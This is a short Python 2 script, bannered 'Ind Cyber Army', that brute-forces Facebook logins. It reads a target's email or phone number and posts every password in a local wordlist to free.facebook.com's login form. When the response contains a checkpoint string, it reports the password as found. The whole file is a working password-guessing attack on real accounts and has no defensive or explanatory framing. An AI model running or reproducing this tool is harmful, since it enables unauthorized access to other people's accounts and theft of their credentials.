import requests
import sys
import os
os.system ('clear')

#Banner

print ('\x1b[1;36m_ _  _ ___     ____ _   _ ___  ____ ____    ____ ____ _  _ _   _ ')
print ('| |\ | |  \    |     \_/  |__] |___ |__/    |__| |__/ |\/|  \_/  ')
print ('| | \| |__/    |___   |   |__] |___ |  \    |  | |  \ |  |   |   ')
print ('                                                                 ')
print ('')
print ('')
print ('\x1b[1;31mBrute force for Facebook')


email = raw_input("\x1b[032mEmail/ID/No.HP :\x1b[1;33m ")

url='https://free.facebook.com/login.php'
ex = open('word.txt',  'r').readlines()

for line in ex:
    password = line.strip()
    http = requests.post(url, data={'email':email, 'pass': password, 'login':'submit'})
    content = http.content
    if "Beranda/logi/cekpoint" in content:
        print "\x1b[1;32m[+] Password Found\x1b[1;37m",password
        sys.exit(1)
    else:
        print "\x1b[1;31m[!] Password Not Found\x1b[1;37m",password

